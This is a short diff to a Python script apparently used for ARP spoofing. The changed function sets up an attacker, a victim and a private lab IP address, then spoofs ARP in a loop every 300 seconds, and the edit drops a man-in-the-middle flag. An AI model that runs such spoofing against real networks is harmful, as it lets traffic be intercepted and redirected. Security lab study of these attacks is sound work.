@@ -12,7 +12,7 @@ def ARPSpoof(n_times = 0):
     arp = ARP(attacker, victim, '192.168.56.102')
     if n_times <= 0:
         while True:
-            arp.spoof(mitm=True)
+            arp.spoof()
             time.sleep(300)
     else:
         arp.spoof()
